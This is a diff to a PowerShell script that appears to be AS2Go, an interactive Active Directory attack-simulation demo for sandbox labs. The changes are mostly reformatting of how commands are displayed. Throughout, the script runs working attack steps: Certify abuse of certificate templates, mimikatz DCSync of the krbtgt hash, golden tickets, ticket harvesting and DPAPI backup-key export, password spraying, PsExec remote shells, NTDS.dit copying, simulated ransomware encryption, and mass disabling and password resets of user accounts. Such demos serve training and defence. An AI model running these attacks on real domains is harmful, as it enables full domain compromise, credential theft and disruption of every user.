@@ -288,8 +288,8 @@ function Start-ConvertingToPfxFromPem {
 
     # example: openssl pkcs12 -in $pemFile -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out $pfxFile
     Write-Host      -NoNewline "  Command: "
-    Write-Highlight -Text "openssl ","pkcs12 -in ", $pemFile, " -keyex -CSP ", """Microsoft Enhanced Cryptographic Provider v1.0""", " -export -out ",$pfxFile `
-                        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV
+    Write-Highlight -Text "openssl ","pkcs12 ","-in ", $pemFile, " -keyex -CSP ", """Microsoft Enhanced Cryptographic Provider v1.0""", " -export -out ",$pfxFile `
+                    -Color $fgcC, $fgcF, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV
     Write-Host ""
     pause
 
@@ -318,7 +318,7 @@ function Start-ConvertingToPfxFromPem {
     Get-Process -name cmd | Format-Table name, id, mainWindowTitle | Out-Host
     pause
 
-    write-host "Saved to file:" -ForegroundColor Yellow
+    write-host "`n  Saved to file:" -ForegroundColor Yellow
     Get-Item $pfxFile | Out-Host
     
     #stop 
@@ -352,8 +352,8 @@ function Start-RequestingCertificate {
 
     # example:  Command: .\certify.exe request /ca:NUC-DC01.SANDBOX.CORP\AS2GO-CA /template:AS2Go /altname:DA-HERRHOZI
     Write-Host      -NoNewline "  Command: "
-    Write-Highlight -Text ".\certify.exe ", "request /ca:", $myEntCA, " /template:", $CAtemplate, " /altname:",$altname `
-                    -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV
+    Write-Highlight -Text ".\certify.exe ", "request ","/ca:", $myEntCA, " /template:", $CAtemplate, " /altname:", $altname    `
+                    -Color $fgcC, $fgcF, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV
     Write-Host ""
     Write-Log -Message "     >> .\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname"
 
@@ -392,7 +392,7 @@ function Start-RequestingCertificate {
         pause
     }
  
-    write-host "Saved to file:" -ForegroundColor Yellow
+    write-host "`n  Saved to file:" -ForegroundColor Yellow
     Get-Item $pemFile | Out-Host
     pause
 
@@ -417,8 +417,8 @@ function Get-VulnerableCertificateTemplate {
     $CAtemplate = "AS2Go"
 
     Write-Host      -NoNewline "  Command: "
-    Write-Highlight -Text ".\certify.exe ", "find /vulnerable" `
-                    -Color $fgcC, $fgcS
+    Write-Highlight -Text ".\certify.exe ", "find ","/vulnerable" `
+                    -Color $fgcC, $fgcF,$fgcS
     Write-Host ""
     Write-log -Message "     .\certify.exe find /vulnerable"
     
@@ -478,7 +478,8 @@ function Get-EnterpriseCAName {
     $answer = Get-Answer -question $question -defaultValue $myEntCA
     Set-KeyValue -key "EnterpriseCA" -NewValue $answer
 
-    Write-Host "`n`nUsing this Enterprise Certification Authority for the next steps - $answer`n`n"
+    Write-Host "`n`nUsing this Enterprise CA for the next steps - " -NoNewline
+    Write-Host "$answer`n`n" -ForegroundColor Yellow
 
     pause
     Write-Log -Message "    >> Using - $answer"
@@ -637,8 +638,8 @@ function New-PasswordSprayAttack {
 
     If ($DeveloperMode) {
         $user = $MyDomain + "\" + $env:USERNAME
-        Write-Host "Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor Yellow -NoNewline
-        Write-Host " with Password: " -NoNewline; Write-Host $MyPW01 -ForegroundColor Yellow
+        Write-Host "`n  Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor Yellow -NoNewline
+        Write-Host " with Password: " -NoNewline; Write-Host $MyPW02 -ForegroundColor Yellow
     }
 
     $question = "Do you also want to run a Password Spray attack with rubues.exe - Y or N? Default "
@@ -771,16 +772,16 @@ function SimulateRansomare {
     If ($answer -eq $yes) {
     
         Write-Host "`n"
-        Write-Warning "All files in $FolderToEncrypt will be encrypted NOW!"
+        Write-Host "WARNING: Starting to encrypt all files in folder " -NoNewline; Write-Host $FolderToEncrypt -ForegroundColor yellow
         Write-Host "`n"
         pause
     
         Confirm-FileAvailabliy -filename "AS2Go-Encryption.ps1"
         .\AS2Go-Encryption.ps1 -share $FolderToEncrypt
     
-        Write-host "`nAmong others, the following file has been encrypted" -ForegroundColor $global:FGCHighLight 
-        Write-host "`  --> $FolderToEncrypt\$filePrefix.txt" -ForegroundColor $global:FGCHighLight
-        Invoke-Item "$FolderToEncrypt\$filePrefix.txt"   
+        Write-host "`nAmong others, the following file has been encrypted" -ForegroundColor $global:FGCHighLight | Out-Host
+        Write-host "`  --> $FolderToEncrypt\$filePrefix.txt" -ForegroundColor $global:FGCHighLight | Out-Host
+        #Invoke-Item "$FolderToEncrypt\$filePrefix.txt"   
     }
 
 
@@ -790,28 +791,23 @@ function SimulateRansomare {
 
 function Get-DirContent {
     param ([string] $Path)
+
     $myfunction = Get-FunctionName
     Write-Log -Message "### Start Function $myfunction ###"
     #region ################## main code | out- host #####################
+    Write-Host ""
     Write-Host -NoNewline "  Command: "
-    Write-Highlight -Text ("Get-ChildItem ","-Path ", $Path, " -Directory") -Color $fgcC, $fgcS, $fgcV,$fgcS
+    Write-Highlight -Text ("Get-ChildItem ","-Path ", $Path) -Color $fgcC, $fgcS, $fgcV
     #Write-Host "Get-ChildItem -Path $Path -Directory" -ForegroundColor $global:FGCCommand
-
+    Write-Host ""
     Try {
-
-        # Code to get or create objects here.
         Get-ChildItem -Path $Path  -ErrorAction Stop | Out-Host
-        # Explicitly return data to the caller.
-    
     }
     Catch {
         #$dirs = "User has NO access to path $Path"
         Write-Host "`n   --> This account has NO access to path $Path`n" -ForegroundColor $global:FGCError
-
     }
-    # Explicitly return data to the caller.
-    $dirs | Out-File -FilePath $scriptLog -Append
-    
+  
     Write-Log -Message "    >> using Get-ChildItem -Path $Path -Directory"
     #endregion ####################### main code #########################
     Write-Log -Message "### End Function $myfunction ###"
@@ -837,7 +833,7 @@ function Get-Files {
     return $files
 }
 
-Function CreateGoldenTicket {
+Function New-GoldenTicket{
 
 
     $myfunction = Get-FunctionName
@@ -862,12 +858,9 @@ Function CreateGoldenTicket {
     Write-Host "____________________________________________________________________`n" 
     Write-Host "         Step 1 of 3 | dump the 'krbtgt' Hash                       "
     Write-Host "____________________________________________________________________`n"     
-        
- 
-
-# example: .\mimikatz.exe "log .\$sFakeUser.log" "lsadump::dcsync /domain:$fqdn /user:krbtgt"  "exit"
-Write-Host      -NoNewline "  Command: "
-Write-Highlight -Text ".\mimikatz.exe ", """log .\", $sFakeUser, ".log",""" ""lsadump::","dcsync", " /domain:",$fqdn, " /user:","krbtgt", """ ""exit"""   `
+    Write-Host
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text ".\mimikatz.exe ", """log .\", $sFakeUser, ".log",""" ""lsadump::","dcsync", " /domain:",$fqdn, " /user:","krbtgt", """ ""exit"""   `
                 -Color $fgcC, $fgcS, $fgcV, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcS
     
     
@@ -885,9 +878,9 @@ Write-Highlight -Text ".\mimikatz.exe ", """log .\", $sFakeUser, ".log",""" ""ls
 
 
     Clear-Host
-    $DomainSID = Get-KeyValue -key "DomainSID" 
+    $DomainSID    = Get-KeyValue -key "DomainSID" 
     $MySearchBase = Get-KeyValue -key "MySearchBase"
-    $krbtgtntml = Get-KeyValue -key "krbtgtntml"
+    $krbtgtntml   = Get-KeyValue -key "krbtgtntml"
         
         
     Do {
@@ -1081,8 +1074,11 @@ function Start-UserManipulation {
     Write-Host "____________________________________________________________________`n" 
     Write-Host "               Try to disable all (DEMO) users                            "
     Write-Host "____________________________________________________________________`n" 
-    Write-Host "`n NEXT STEP: " -NoNewline
-    Write-Host "get-aduser -filter * -SearchBase $MySearchBase | Disable-ADAccount`n" -ForegroundColor $FGCCommand
+    Write-Host ""
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text "get-aduser ", "-filter * ", "-SearchBase ", "$MySearchBase ", "| Disable-ADAccount"  `
+                    -Color $fgcC,              $fgcS,           $fgcS,          $fgcV,   $fgcC
+    Write-Host ""
 
     $question = "Do you want to disable all $count users  - Y or N? Default "
     $answer = Get-Answer -question $question -defaultValue $Yes
@@ -1120,8 +1116,11 @@ function Start-UserManipulation {
     Write-Host "____________________________________________________________________`n" 
     Write-Host "        Try to reset all users password                             "
     Write-Host "____________________________________________________________________`n" 
-    Write-Host "`n NEXT STEP: " -NoNewline
-    Write-Host "Get-aduser | Set-ADAccountPassword -Reset -NewPassword $newRandomPW`n" -ForegroundColor $FGCCommand
+    Write-Host ""
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text "Get-aduser | Set-ADAccountPassword", " -Reset -NewPassword ", "$newRandomPW"  `
+                    -Color $fgcC,              $fgcS,           $fgcV
+    Write-Host ""
 
     $question = "Do you also want to reset the user's password with the random password '$newRandomPW' - Y or N? Default "
     $answer = Get-Answer -question $question -defaultValue $Yes
@@ -1154,6 +1153,7 @@ function Start-UserManipulation {
         $EndDate = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
         $duration = NEW-TIMESPAN –Start $StartDate –End $EndDate
         Write-Host "  'Game over' after just " -NoNewline; Write-Host "$duration [h]`n" -ForegroundColor Yellow
+        Write-Host ""
         Pause
     }
 
@@ -1316,12 +1316,19 @@ function Start-Exfiltration {
     $myfunction = Get-FunctionName
     Write-Log -Message "### Start Function $myfunction ###"
     #####
-
+    Write-Host ""
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text "net ", "view ", "\\$mydc" `
+                    -Color $fgcC, $fgcF, $fgcV
+    Write-Host ""
+    
     net view \\$mydc
 
     Pause
 
-    Access-Directory -directory $OfflineDITFile
+    Get-DirContent -Path $OfflineDITFile
+
+    #Access-Directory -directory $OfflineDITFile
 
 
     #dir \\%mydc%\ad-backup
@@ -1330,9 +1337,15 @@ function Start-Exfiltration {
     Write-Host "____________________________________________________________________`n" 
     Write-Host "             try to open cmd console on $myAppServer"
     Write-Host "____________________________________________________________________`n" 
-    write-host "Start-Process .\PsExec.exe -ArgumentList ""\\$myAppServer -accepteula cmd.exe""" -ForegroundColor $global:FGCCommand
-    write-host ""
-    write-host ""
+    #write-host "Start-Process .\PsExec.exe -ArgumentList ""\\$myAppServer -accepteula cmd.exe""" -ForegroundColor $global:FGCCommand
+    #write-host ""
+    #write-host ""
+
+    Write-Host ""
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text "Start-Process ", ".\PsExec.exe ", "-ArgumentList ",  """\\$myAppServer -accepteula cmd.exe""" `
+                    -Color $fgcC, $fgcF, $fgcS, $fgcV
+    Write-Host ""
 
     try {
         Write-Output "more C:\temp\as2go\my-passwords.txt" | Set-Clipboard
@@ -1346,7 +1359,7 @@ function Start-Exfiltration {
     Start-Process .\PsExec.exe -ArgumentList "\\$myAppServer -accepteula cmd.exe"
     write-host ""
     write-host ""
-    write-host " Try to find some sensitive data, e.g. files with passwords" -ForegroundColor $global:FGCCommand
+    write-host " Try to find some sensitive data, e.g. files with passwords" 
     write-host " more C:\temp\as2go\my-passwords.txt`n" -ForegroundColor $global:FGCCommand
 
     Pause
@@ -1357,17 +1370,24 @@ function Start-Exfiltration {
     Write-Host "____________________________________________________________________`n" 
     Write-Host "                  Data exfiltration over SMB Share                  "
     Write-Host "____________________________________________________________________`n" 
-    Pause
-
+    
     New-Item $exfiltration -ItemType directory -ErrorAction Ignore
+    
+    Write-Host ""
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text "Copy-Item ", "-Path ", "$OfflineDITFile\*.* ", " -Destination ", "$exfiltration" `
+                    -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV
+    Write-Host ""
 
-    write-host "   Copy-Item -Path $OfflineDITFile\*.* -Destination $exfiltration" -ForegroundColor $global:FGCCommand
+    Pause   
     Copy-Item -Path $OfflineDITFile\*.* -Destination $exfiltration
+    Write-Host ""
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text "Get-Item ", "-Path ", "$exfiltration\*.dit" `
+                    -Color $fgcC, $fgcS, $fgcV
+    Write-Host ""
 
-    write-host ""
-
-    write-host "   Get-Item $exfiltration\*.dit" -ForegroundColor $global:FGCCommand
-    Get-Item "$exfiltration\*.dit" | Out-Host
+    Get-Item -Path "$exfiltration\*.dit" | Out-Host
     Pause
 
     #####
@@ -1716,7 +1736,7 @@ function Get-AS2GoSettings {
         $question = "Do you need to update more settings - Y or N? Default "
         $repeat = Get-Answer -question $question -defaultValue $no
 
-        If ($skipstep) { break }   
+        # If ($skipstep) { break }   
    
     } Until ($repeat -eq $no)
 
@@ -1738,70 +1758,22 @@ function Access-Directory {
     Write-Log -Message "### Start Function $myfunction ###"
     #####
 
-    Get-ChildItem -Path $directory
+    Write-Host ""
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text "Get-ChildItem ", "$directory ", "-filter ", "*.*" `
+                    -Color $fgcC, $fgcF, $fgcS, $fgcF
+    Write-Host ""
 
-    Write-Host "`nGet-ChildItem -Directory $directory -Filter *.* -ErrorAction SilentlyContinue -Force" -ForegroundColor $global:FGCCommand
-
-    #Get-Item "$directory"
-    #$content = Get-ChildItem -Directory $directory -Force -ErrorAction SilentlyContinue
-    #clear
-    #$directory = "\\mtp-ms12\c$"
 
     Try {
-        Get-ChildItem -Path $directory | Out-File -FilePath .\Process.txt
-        #dir $directory -Force -ErrorAction Stop
-        Write-Host "`n   --> You have ACCESS to direcotry '$directory'`n" -ForegroundColor $global:FGCQuestion
+        Get-ChildItem -Path $directory -Force -ErrorAction Stop | Out-Host
+        #Write-Host "`n   --> You have ACCESS to direcotry '$directory'`n" -ForegroundColor $global:FGCQuestion | Out-Host
     }
     catch {
-        Write-Host "`n   --> No(!) ACCESS to direcotry '$directory'`n"    -ForegroundColor $global:FGCError
+        Write-Host "`n   --> No(!) ACCESS to direcotry '$directory'`n"    -ForegroundColor $global:FGCError | Out-Host
     }
-
 
     return
-
-
-
-    #####
-    Write-Log -Message $directory
-    Write-Log -Message "### End Function $myfunction ###"
-}
-
-function Access-Directory1 {
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $directory
-    )
-
-    $myfunction = Get-FunctionName
-    Write-Log -Message "### Start Function $myfunction ###"
-    #####
-
-    Get-ChildItem -Path $directory
-
-    Write-Host "`nGet-ChildItem -Directory $directory -Filter *.* -ErrorAction SilentlyContinue -Force" -ForegroundColor $global:FGCCommand
-
-    #Get-Item "$directory"
-    #$content = Get-ChildItem -Directory $directory -Force -ErrorAction SilentlyContinue
-    #clear
-    #$directory = "\\mtp-ms12\c$"
-
-    Try {
-        Get-ChildItem -Path $directory | Out-Host
-        #dir $directory -Force -ErrorAction Stop
-        Write-Host "`n   --> You have ACCESS to direcotry '$directory'`n" -ForegroundColor $global:FGCQuestion
-    }
-    catch {
-        Write-Host "`n   --> No(!) ACCESS to direcotry '$directory'`n"    -ForegroundColor $global:FGCError
-    }
-
-
-
-
-
-
     #####
     Write-Log -Message $directory
     Write-Log -Message "### End Function $myfunction ###"
@@ -2019,6 +1991,7 @@ function Start-PtT-Attack {
     Write-Host "____________________________________________________________________`n" 
     Write-Host "           harvest tickets on Admin PC $mySAW                      "
     Write-Host "____________________________________________________________________`n" 
+    Write-Host ""
     Write-Host      -NoNewline "  Command: "
     Write-Highlight -Text "PsExec.exe ", "\\$mySAW ", "-accepteula ", "cmd /c ", "('cd c:\temp\tickets & mimikatz.exe ""privilege::debug"" ""sekurlsa::tickets /export""  ""exit""')"  `
                     -Color $fgcC, $fgcV, $fgcS, $fgcC, $fgcV
@@ -2515,7 +2488,7 @@ Function Start-AS2GoDemo {
         If ($showStep) { Show-Step -step "step_004.html" }
 
         Do {
-            If ($skipstep) { break }            
+            # If ($skipstep) { break }            
             
             Clear-Host
             Write-Host "____________________________________________________________________`n" 
@@ -2782,7 +2755,7 @@ Function Start-AS2GoDemo {
         else {
         }
 
-        If ($skipstep) {break}
+        # If ($skipstep) {break}
 
         Write-Host "____________________________________________________________________`n" 
         Write-Host "      ??? REPEAT | Attack Level - COMPROMISED User Account ???      "
@@ -2810,7 +2783,7 @@ Function Start-AS2GoDemo {
     #Set-KeyValue -key "LastStage" -NewValue $stage10
     If ($showStep) { Show-Step -step "step_006.html" }
     Do {
-        If ($skipstep) { break }     
+        # If ($skipstep) { break }     
         Clear-Host
         Write-Host "____________________________________________________________________`n" 
         Write-Host "                   Attack Level - RECONNAISSANCE                    "
@@ -2866,7 +2839,7 @@ Function Start-AS2GoDemo {
     Set-KeyValue -key "LastStage" -NewValue $stage20
     If ($showStep) { Show-Step -step "step_007.html" }
     Do {
-        If ($skipstep) { break }     
+        # If ($skipstep) { break }     
         Clear-Host
         Write-Host "____________________________________________________________________`n" 
         Write-Host "                 Attack Level - LATERAL MOVEMENT                    "
@@ -3118,8 +3091,6 @@ Function Start-AS2GoDemo {
     
         }
 
-
-
         Clear-Host
 
         Write-Host "____________________________________________________________________`n" 
@@ -3183,32 +3154,38 @@ Function Start-AS2GoDemo {
             Clear-Host
             Write-Host "____________________________________________________________________`n" 
             Write-Host "        try to export DATA PROTECTION API master key                "
+            Write-Host ""
+            write-host "    Attackers can use the master key to decrypt ANY secret "         
+            Write-Host "        protected by DPAPI on all domain-joined machines"
             Write-Host "____________________________________________________________________`n"     
-            write-host "Attackers can use the master key to decrypt ANY secret `nprotected by DPAPI on all domain-joined machines" -ForegroundColor $global:FGCHighLight
             write-host ""
-            Write-Host "`n NEXT STEP: " -NoNewline
-            Write-Host "mimikatz.exe ""privilege::debug"" ""lsadump::backupkeys /system:$mydc.$fqdn /export"" ""exit""`n" -ForegroundColor $global:FGCCommand
-    
+            Write-Host      -NoNewline "  Command: "
+            Write-Highlight -Text ".\mimikatz.exe ", """cd $exfiltration"" ", """privilege::", "debug", """ ""lsadump::", "backupkeys ", "/system:","$mydc.$fqdn", " /export",  """ ""exit"""  `
+                            -Color $fgcC, $fgcV, $fgcF, $fgcV, $fgcF, $fgcV, $fgcS, $fgcV, $fgcS, $fgcF
+            Write-Host  ""
+
             $question = "Do you want to run this step - Y or N? Default "
             $answer = Get-Answer -question $question -defaultValue $Yes
 
             If ($answer -eq $yes) {
                 New-Item $exfiltration -ItemType directory -ErrorAction Ignore
                 Invoke-Command -ScriptBlock { .\mimikatz.exe "cd $exfiltration" "privilege::debug" "lsadump::backupkeys /system:$mydc.$fqdn /export" "exit" }
-                get-item "$exfiltration\ntds_*" | Write-Output
+                write-host ""
+                Write-Host      -NoNewline "  Command: "
+                Write-Highlight -Text "get-item ", "$exfiltration\ntds_*"  `
+                                -Color $fgcC, $fgcV
+                Write-Host  ""   
+                get-item "$exfiltration\ntds_*" | out-host
                 Pause
             }
-     
- 
+   
             Clear-Host
             Write-Host "____________________________________________________________________`n" 
             Write-Host "            User Manipulation - Disable & PW reset                   "
             Write-Host "____________________________________________________________________`n" 
   
-
             $EmojiIcon = [System.Convert]::toInt32("1F600", 16)
             $Smily = [System.Char]::ConvertFromUtf32($EmojiIcon)
-
 
     
             Write-host "  ... will ignore your new backdoor user " -NoNewline
@@ -3252,7 +3229,7 @@ Function Start-AS2GoDemo {
             If ($answer -eq $yes) {
 
                 #run function
-                CreateGoldenTicket
+                New-GoldenTicket
                 Pause
             } 
     
